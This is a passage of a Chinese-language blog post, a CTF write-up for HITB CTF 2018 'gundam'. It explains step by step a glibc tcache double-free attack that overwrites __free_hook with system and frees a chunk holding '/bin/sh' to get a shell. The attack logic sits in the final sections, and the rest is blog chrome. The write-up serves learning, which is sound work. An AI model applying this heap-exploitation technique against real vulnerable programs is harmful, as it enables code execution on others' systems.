+<p><strong>3. 执行 <code>read(0, ptr, ...)</code></strong><br>你往 Chunk 0 里写了 <code>0xdeadbeef</code>。</p>
+<ul>
+<li><strong>结果</strong> ：Chunk 0 的前 8 字节确实变成了 <code>0xdeadbeef</code>。</li>
+<li><strong>影响</strong> ：毫无影响。因为 Tcache Head 现在盯着的是 Chunk 1。你把 Chunk 0 砸烂了也跟 Tcache 没关系了，那是你自己的数据区。</li>
+</ul>
+<hr>
+<h5 id="情况二：Double-Free-环-Head-Chunk-0-Chunk-0"><a href="#情况二：Double-Free-环-Head-Chunk-0-Chunk-0" class="headerlink" title="情况二：Double Free 环 (Head -&gt; Chunk 0 -&gt; Chunk 0)"></a>情况二：Double Free 环 (Head -&gt; Chunk 0 -&gt; Chunk 0)</h5><p>现在看看为什么之前的情况能成功修改链表。</p>
+<p><strong>1. 初始状态</strong></p>
+<ul>
+<li><strong>Tcache Head</strong> : 指向 Chunk 0</li>
+<li><strong>Chunk 0 内容</strong> : 存储着 Chunk 0 的地址 (因为它指向自己)</li>
+<li><strong>链表</strong> : <code>Head -&gt; Chunk 0 -&gt; Chunk 0</code> (死循环)</li>
+</ul>
+<p><strong>2. 执行 <code>ptr = malloc(...)</code></strong><br>系统再次执行 <code>tcache_get()</code>：</p>
+<ol>
+<li><strong>读</strong> : 系统查看 Head，找到了 Chunk 0。</li>
+<li><strong>存</strong> : 系统读取 Chunk 0 里的 <code>next</code> 指针（ <strong>还是 Chunk 0</strong> ）。</li>
+<li><strong>移</strong> : 系统把  <strong>Tcache Head 更新为 Chunk 0</strong> 。</li>
+<li><strong>给</strong> : 系统把 Chunk 0 给用户。</li>
+</ol>
+<p><strong>此时的状态（malloc 刚结束）：</strong></p>
+<ul>
+<li><strong>用户</strong> : 拥有 Chunk 0。</li>
+<li><strong>Tcache Head</strong> :  <strong>依然指向 Chunk 0</strong> （因为刚才读出来的 next 就是它自己）。</li>
+<li><strong>关键点</strong> ：Chunk 0 既是“用户正在使用的内存”，又是“Tcache 链表里的下一个空闲块”。<strong>它脚踏两只船。</strong></li>
+</ul>
+<p><strong>3. 执行 <code>read(0, ptr, ...)</code></strong><br>你往 Chunk 0 里写了 <code>&amp;free_hook</code>。</p>
+<ul>
+<li><strong>物理上</strong> ：Chunk 0 的前 8 字节变成了 <code>&amp;free_hook</code>。</li>
+<li><strong>逻辑上</strong> ：因为 Tcache Head 此时还指着 Chunk 0，系统认为 Chunk 0 里面的数据就是 <strong>下一个块的地址</strong> 。</li>
+<li><strong>结果</strong> ：你把“下一个块”从 Chunk 0 改成了 <code>free_hook</code>。链表变成了 <code>Head -&gt; Chunk 0 -&gt; free_hook</code>。</li>
+</ul>
+<h3 id="8-如何拿到的shell？"><a href="#8-如何拿到的shell？" class="headerlink" title="8.如何拿到的shell？"></a>8.如何拿到的shell？</h3><h5 id="前置状态回顾"><a href="#前置状态回顾" class="headerlink" title="前置状态回顾"></a>前置状态回顾</h5><p>在执行这三步之前，你已经成功构造了 Double Free 闭环，且刚开始执行第一步。<br>此时 Tcache 链表状态为：<code>Head -&gt; Chunk 0 -&gt; Chunk 0</code>。</p>
+<hr>
+<h5 id="第一步：build-p64-free-hook-addr"><a href="#第一步：build-p64-free-hook-addr" class="headerlink" title="第一步：build(p64(__free_hook_addr))"></a>第一步：<code>build(p64(__free_hook_addr))</code></h5><ul>
+<li><strong>动作</strong> ：申请内存，并写入 <code>__free_hook</code> 的地址。</li>
+<li><strong>分配过程</strong> ：</li>
+</ul>
+<ol>
+<li>系统查看 Tcache Head，拿出 <strong>Chunk 0</strong> 给用户。</li>
+<li>系统读取 Chunk 0 里的 next 指针（指向 Chunk 0），更新 Head 指向  <strong>Chunk 0</strong> 。</li>
+</ol>
+<ul>
+<li><strong>写入过程</strong> ：</li>
+</ul>
+<ol>
+<li>你往 Chunk 0 的用户数据区（也就是存放 next 指针的地方）写入了 <code>__free_hook</code> 的地址。</li>
+</ol>
+<ul>
+<li><strong>结果</strong> ：</li>
+<li>Tcache Head 依然指向 Chunk 0。</li>
+<li>但是 Chunk 0 的 next 指针变成了 <code>__free_hook</code>。</li>
+<li><strong>新链表状态</strong> ：<code>Head -&gt; Chunk 0 -&gt; __free_hook</code>。</li>
+</ul>
+<h5 id="第二步：build-bin-sh"><a href="#第二步：build-bin-sh" class="headerlink" title="第二步：build(&#39;/bin/sh&#39;)"></a>第二步：<code>build(&#39;/bin/sh&#39;)</code></h5><ul>
+<li><strong>动作</strong> ：再次申请内存，写入字符串 <code>/bin/sh</code>。</li>
+<li><strong>分配过程</strong> ：</li>
+</ul>
+<ol>
+<li>系统查看 Tcache Head，再次拿出 <strong>Chunk 0</strong> 给用户。<ul>
+<li><em>注意：此时对应代码中的 index 1（假设之前 index 0 被释放了），或者某个变量指向了这里。</em></li>
+</ul>
+</li>
+<li>系统读取 Chunk 0 的 next 指针（上一轮被你改成了 <code>__free_hook</code>），更新 Head 指向  <strong><code>__free_hook</code></strong> 。</li>
+</ol>
+<ul>
+<li><strong>写入过程</strong> ：</li>
+</ul>
+<ol>
+<li>你往 Chunk 0 里写入了 <code>/bin/sh\x00</code>。</li>
+</ol>
+<ul>
+<li><strong>结果</strong> ：</li>
+<li><strong>新链表状态</strong> ：<code>Head -&gt; __free_hook</code>。</li>
+<li><strong>重要产物</strong> ：你拥有了一个指针（假设是 <code>gundam[1]</code>），它指向的内存里存着字符串 <code>/bin/sh</code>。</li>
+</ul>
+<h5 id="第三步：build-p64-system-addr"><a href="#第三步：build-p64-system-addr" class="headerlink" title="第三步：build(p64(system_addr))"></a>第三步：<code>build(p64(system_addr))</code></h5><ul>
+<li><strong>动作</strong> ：再次申请内存，写入 <code>system</code> 函数的地址。</li>
+<li><strong>分配过程</strong> ：</li>
+</ul>
+<ol>
+<li>系统查看 Tcache Head，发现指向的是  <strong><code>__free_hook</code> 的地址</strong> 。</li>
+<li>系统并不知道这其实不是堆内存，它照常把这个地址返回给你。</li>
+</ol>
+<ul>
+<li><strong>写入过程</strong> ：</li>
+</ul>
+<ol>
+<li>你往这个地址（即 <code>__free_hook</code> 所在的内存单元）写入了 <code>system_addr</code>。</li>
+</ol>
+<ul>
+<li><strong>结果</strong> ：</li>
+<li>你修改了 Glibc 的全局变量 <code>__free_hook</code>。</li>
+<li><strong>现在的逻辑</strong> ：<code>__free_hook = &amp;system</code>。</li>
+</ul>
+<hr>
+<h5 id="第四步：destroy-0"><a href="#第四步：destroy-0" class="headerlink" title="第四步：destroy(0)"></a>第四步：<code>destroy(0)</code></h5><p>你选择释放那个存有 <code>/bin/sh</code> 的 Chunk（即步骤二申请到的那个）。</p>
+<ul>
+<li><strong>动作</strong> ：执行 <code>free(gundam[1])</code>。</li>
+<li><strong>底层原理</strong> ：<br>Linux Glibc 的 <code>free</code> 函数在执行真正的内存释放逻辑之前，会先检查 <code>__free_hook</code> 这个钩子函数是否为空。逻辑大致如下（伪代码）：</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void __libc_free(void *ptr) &#123;</span><br><span class="line">    // 1. 检查钩子是否存在</span><br><span class="line">    if (__free_hook != NULL) &#123;</span><br><span class="line">        // 2. 如果存在，直接调用钩子函数，并把准备释放的 ptr 当作参数传进去</span><br><span class="line">        return __free_hook(ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ... 如果钩子为空，才执行正常的释放逻辑 ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>实际执行流</strong> ：</li>
+</ul>
+<ol>
+<li>你调用 <code>free(ptr)</code>，其中 <code>ptr</code> 指向字符串 <code>&quot;/bin/sh&quot;</code>。</li>
+<li>程序检查 <code>__free_hook</code>，发现它不为空（我们在第三步把它改成了 <code>system</code> 的地址）。</li>
+<li>程序执行 <code>__free_hook(ptr)</code>，这就等价于执行：<br><strong><code>system(&quot;/bin/sh&quot;)</code></strong></li>
+</ol>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> gundam</li>
+        <li><strong>Author:</strong> A1ex</li>
+        <li><strong>Created at
+                :</strong> 2025-12-02 11:19:17</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-02 11:54:10
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://havenoideal123.github.io/2025/12/02/gundam/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/11/23/yunsee%E5%85%A5%E7%BE%A4%E6%B5%8B%E8%AF%95/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">yunsee入群测试</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'havenoideal123/giscus_storage',
+                'data-repo-id': 'R_kgDOQMJJcA',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDOQMJJcM4CxQZl',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'not-lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">gundam</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HITB-CTF-2018-gundam"><span class="nav-text">HITB CTF 2018 gundam</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#wp"><span class="nav-text">wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%89%E4%BA%9B%E9%9C%80%E8%A6%81%E7%90%86%E8%A7%A3%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">有些需要理解的知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-glibc-2-26%E5%BC%95%E5%85%A5%E7%9A%84tcache%E6%9C%BA%E5%88%B6"><span class="nav-text">1.glibc 2.26引入的tcache机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8unsorted-bin-attack%E6%B3%84%E9%9C%B2main-arean%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%80%8C%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80%E3%80%82%E7%94%B3%E8%AF%B79%E4%B8%AAchunk%EF%BC%8C%E9%87%8A%E6%94%BE7%E4%B8%AA%E5%A1%AB%E6%BB%A1tcache%EF%BC%8C%E5%9C%A8%E9%87%8A%E6%94%BE%E4%B8%80%E4%B8%AA%E8%BF%9B%E5%85%A5unsorted-bin%EF%BC%8C%E5%89%A9%E4%B8%8B%E4%B8%80%E4%B8%AA%E9%98%BB%E9%9A%94top-chunk%E9%98%B2%E6%AD%A2%E5%90%88%E5%B9%B6"><span class="nav-text">2.利用unsorted bin attack泄露main_arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted bin，剩下一个阻隔top chunk防止合并</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%A3%80%E6%9F%A5%E5%90%88%E5%B9%B6%EF%BC%88Backward%EF%BC%89%EF%BC%9A%E6%9F%A5%E7%9C%8B%E5%89%8D%E4%B8%80%E4%B8%AA%E7%89%A9%E7%90%86%E7%9B%B8%E9%82%BB%E7%9A%84%E5%9D%97%EF%BC%88Chunk-6%EF%BC%89%E3%80%82%E8%99%BD%E7%84%B6-Chunk-6-%E5%B7%B2%E7%BB%8F%E8%A2%AB-free-%E8%BF%9B-Tcache-%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF-Tcache-%E6%9C%BA%E5%88%B6%E4%B8%8D%E4%BC%9A%E6%B8%85%E9%99%A4%E7%89%A9%E7%90%86%E7%9B%B8%E9%82%BB%E5%9D%97%E7%9A%84-PREV-INUSE-P-%E6%A0%87%E5%BF%97%E4%BD%8D%E3%80%82%E6%89%80%E4%BB%A5%E7%B3%BB%E7%BB%9F%E8%AE%A4%E4%B8%BA-Chunk-6-%E8%BF%98%E6%98%AF%E2%80%9C%E4%BD%BF%E7%94%A8%E4%B8%AD%E2%80%9D%E7%9A%84%EF%BC%8C%E4%B8%8D%E4%BC%9A%E5%90%91%E4%BD%8E%E5%9C%B0%E5%9D%80%E5%90%88%E5%B9%B6%E3%80%82%E6%88%91%E8%BF%99%E9%87%8C%E4%B8%8D%E6%98%AF%E5%B7%B2%E7%BB%8Ffree%E4%BA%866%E4%BA%86%E5%90%97%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%98%E6%98%AF%E4%BD%BF%E7%94%A8%E4%B8%AD"><span class="nav-text">3.检查合并（Backward）：查看前一个物理相邻的块（Chunk 6）。虽然 Chunk 6 已经被 free 进 Tcache 了，但是 Tcache 机制不会清除物理相邻块的 PREV_INUSE (P) 标志位。所以系统认为 Chunk 6 还是“使用中”的，不会向低地址合并。我这里不是已经free了6了吗，为什么还是使用中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%88%91%E9%87%8A%E6%94%BE%E4%BA%868%E4%B8%AAchunk%E5%90%8E%EF%BC%8C%E6%88%91%E7%8E%B0%E5%9C%A8%E5%86%8D%E7%94%B3%E8%AF%B78%E4%B8%AA%EF%BC%8C%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E6%AD%A4%E6%97%B6%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%B3%84%E9%9C%B2libc"><span class="nav-text">4.我释放了8个chunk后，我现在再申请8个，详细解释此时为什么能泄露libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-destroy-0%EF%BC%89destroy-0-blow-up-build-p64-free-hook-addr-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91-%E5%88%A0%E4%BA%86blow-up%E5%90%8E%EF%BC%8C%E4%BC%9A%E5%8D%A1%E4%BD%8F"><span class="nav-text">5. destroy(0）destroy(0)blow_up() build(p64(__free_hook_addr)) 为什么我 删了blow_up后，会卡住</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E9%87%8D%E6%96%B0%E7%94%B3%E8%AF%B7%E7%9A%84%E6%97%B6%E5%80%99%E5%8F%82%E6%95%B0%E5%86%99%E6%88%90free-hook%E7%9A%84%E5%9C%B0%E5%9D%80%E5%B0%B1%E4%BC%9A%E4%BD%BF%E5%BE%97fd%E6%8C%87%E5%90%91%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E4%BA%86"><span class="nav-text">6.详细解释为什么我重新申请的时候参数写成free_hook的地址就会使得fd指向这个地址了</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E9%82%A3%E5%A6%82%E6%9E%9C%E6%98%AFHead-Chunk-0-chunk-1%EF%BC%8C%E6%88%91%E5%9C%A8malloc%E5%90%8E%EF%BC%8Cread%E5%86%99%E5%85%A5chunk0%E6%98%AF%E4%B8%8D%E6%98%AF%E4%B9%9F%E6%94%B9%E5%8F%98%E4%BA%86%E5%AE%83%E7%9A%84next%E6%8C%87%E9%92%88%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%B2%A1%E6%9C%89%E5%BD%A2%E6%88%90%E7%8E%AF%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">7.那如果是Head -&gt; Chunk 0 -&gt; chunk 1，我在malloc后，read写入chunk0是不是也改变了它的next指针，也就是没有形成环的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%A6%82%E4%BD%95%E6%8B%BF%E5%88%B0%E7%9A%84shell%EF%BC%9F"><span class="nav-text">8.如何拿到的shell？</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">A1ex</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        13 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
